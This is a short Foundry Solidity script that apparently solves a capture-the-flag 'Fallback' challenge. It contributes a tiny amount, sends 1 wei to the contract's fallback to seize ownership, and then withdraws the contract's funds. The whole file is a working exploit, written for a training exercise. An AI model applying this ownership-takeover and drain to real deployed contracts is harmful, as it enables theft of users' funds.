// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console2} from "forge-std/Script.sol";
import {Fallback} from  "../src/Challenge-1.sol";

contract Solution1Script is Script {

    Fallback public fallbackInstance = Fallback(payable(0x95b9C58A133433330E443654e1310dd50D8F958a)); 

    function run() public {
        vm.startBroadcast();
        console2.log("Owner: ", fallbackInstance.owner());
        fallbackInstance.contribute{value : 0.0001 ether}();
        (bool success, ) = address(fallbackInstance).call{value: 1 wei}("");
        console2.log("Success: ", success);
        console2.log("Owner: ", fallbackInstance.owner());
        fallbackInstance.withdraw();

        vm.stopBroadcast();
    }
}
